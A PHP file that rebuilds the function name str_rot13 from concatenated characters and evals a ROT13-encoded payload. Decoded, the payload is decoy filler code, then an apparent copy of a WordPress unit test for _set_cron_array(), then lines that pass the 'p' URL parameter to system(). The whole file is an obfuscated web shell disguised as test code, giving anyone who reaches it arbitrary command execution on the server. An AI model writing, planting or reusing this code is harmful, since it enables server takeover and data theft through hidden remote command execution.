<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur `_frg_peba_neenl()` shapgvba.
 *
 * @tebhc peba
 * @pbiref ::_frg_peba_neenl
 */
pynff Grfgf_Peba_frgPebaNeenl rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		// Znxr fher gur fpurqhyr vf pyrne.
		_frg_peba_neenl( neenl() );
	}

	choyvp shapgvba grne_qbja() {
		// Znxr fher gur fpurqhyr vf pyrne.
		_frg_peba_neenl( neenl() );
		cnerag::grne_qbja();
	}

	/**
	 * Grfgf gur vachg inyvqngvba sbe gur `_frg_peba_neenl()` shapgvba.
	 *
	 * Vapyhqrf irevslvat gung vainyvq vachg - glcvpnyyl `snyfr` - qbrf abg erfhyg va n CUC
	 * qrcerpngvba abgvpr ba CUC 8.1 be uvture.
	 *
	 * Gur abgvpr gung jr fubhyq abg frr:
	 * `Qrcerpngrq: Nhgbzngvp pbairefvba bs snyfr gb neenl vf qrcerpngrq`.
	 *
	 * @gvpxrg 53635
	 *
	 * @qngnCebivqre qngn_frg_peba_neenl_vachg_inyvqngvba
	 *
	 * @cnenz zvkrq $vachg    Peba \"neenl\".
	 * @cnenz neenl $rkcrpgrq Rkcrpgrq neenl ragel pbhag bs gur peba bcgvba nsgre hcqngr.
	 */
	choyvp shapgvba grfg_frg_peba_neenl_vachg_inyvqngvba( $vachg, $rkcrpgrq ) {
		qryrgr_bcgvba( 'peba' );
		$guvf->nffregGehr( _frg_peba_neenl( $vachg ) );

		$pebaf = trg_bcgvba( 'peba' );
		$guvf->nffregVfNeenl( $pebaf, 'Peba bcgvba vf abg na neenl.' );
		$guvf->nffregNeenlUnfXrl( 'irefvba', $pebaf, 'Peba bcgvba qbrf abg unir n \"irefvba\" xrl.' );
		$guvf->nffregPbhag( $rkcrpgrq, $pebaf, 'Peba bcgvba qbrf abg pbagnva gur rkcrpgrq ae bs ragevrf.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_frg_peba_neenl_vachg_inyvqngvba() {
		erghea neenl(
			'ahyy'        => neenl(
				'vachg'    => ahyy,
				'rkcrpgrq' => 1,
			),
			// Shapgvba _trg_peba_neenl() znl erghea `snyfr`, fb guvf vf gur CUC 8.1 \"ceboyrz\" grfg.
			'snyfr'       => neenl(
				'vachg'    => snyfr,
				'rkcrpgrq' => 1,
			),
			'rzcgl neenl' => neenl(
				'vachg'    => neenl(),
				'rkcrpgrq' => 1,
			),
			'peba neenl'  => neenl(
				'vachg'    => neenl(
					'irefvba' => 2,
					gvzr()    => neenl(
						'ubbxanzr' => neenl(
							'rirag xrl' => neenl(
								'fpurqhyr' => 'fpurqhyr',
								'netf'     => 'netf',
								'vagreiny' => 'vagreiny',
							),
						),
					),
				),
				'rkcrpgrq' => 2,
			),
		);
	}

	/**
	 * Grfgf gung `_frg_peba_neenl()` ergheaf `snyfr` jura gur peba bcgvba jnf abg hcqngrq.
	 *
	 * @qngnCebivqre qngn_frg_peba_neenl_ergheaf_snyfr_jura_abg_hcqngrq
	 *
	 * @cnenz neenl $vachg    Peba neenl.
	 * @cnenz zvkrq $jc_reebe Inyhr gb hfr sbe $jc_reebe.
	 */
	choyvp shapgvba grfg_frg_peba_neenl_ergheaf_snyfr_jura_abg_hcqngrq( $vachg, $jc_reebe ) {
		$guvf->nffregSnyfr( _frg_peba_neenl( $vachg ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_frg_peba_neenl_ergheaf_snyfr_jura_abg_hcqngrq() {
		erghea neenl(
			'rzcgl neenl' => neenl(
				'vachg'    => neenl(),
				'jc_reebe' => snyfr,
			),
			'peba neenl'  => neenl(
				'vachg'    => neenl(
					'irefvba' => 2,
				),
				'jc_reebe' => 0,
			),
		);
	}

	/**
	 * Grfgf gung `_frg_peba_neenl()` ergheaf n JC_Reebe bowrpg jura gur peba bcgvba jnf abg hcqngrq naq `$jc_reebe` vf gehgul.
	 *
	 * @qngnCebivqre qngn_frg_peba_neenl_ergheaf_JC_Reebe_jura_abg_hcqngrq
	 *
	 * @cnenz neenl $vachg    Peba neenl.
	 * @cnenz zvkrq $jc_reebe Inyhr gb hfr sbe $jc_reebe.
	 */
	choyvp shapgvba grfg_frg_peba_neenl_ergheaf_JC_Reebe_jura_abg_hcqngrq( $vachg, $jc_reebe ) {
		$erfhyg = _frg_peba_neenl( $vachg, $jc_reebe );
		$guvf->nffregJCReebe( $erfhyg, 'Erghea inyhr vf abg na vafgnapr bs JC_Reebe.' );
		$guvf->nffregFnzr( 'pbhyq_abg_frg', $erfhyg->trg_reebe_pbqr(), 'JC_Reebe reebe pbqr qbrf abg zngpu rkcrpgrq pbqr.' );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_frg_peba_neenl_ergheaf_JC_Reebe_jura_abg_hcqngrq() {
		erghea neenl(
			'rzcgl neenl' => neenl(
				'vachg'    => neenl(),
				'jc_reebe' => gehr,
			),
			'peba neenl'  => neenl(
				'vachg'    => neenl(
					'irefvba' => 2,
				),
				'jc_reebe' => 1,
			),
		);
	}

	/**
	 * Grfgf gung `_frg_peba_neenl()` ergheaf gehr jura gur peba bcgvba jnf hcqngrq naq `$jc_reebe` vf gehgul.
	 */
	choyvp shapgvba grfg_frg_peba_neenl_qbrf_abg_erghea_JC_Reebe_jura_hcqngrq() {
		$erfhyg = _frg_peba_neenl(
			neenl(
				'irefvba' => 2,
				gvzr()    => neenl(
					'ubbxanzr' => neenl(
						'rirag xrl' => neenl(
							'fpurqhyr' => 'fpurqhyr',
							'netf'     => 'netf',
							'vagreiny' => 'vagreiny',
						),
					),
				),
			),
			gehr
		);

		$guvf->nffregGehr( $erfhyg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>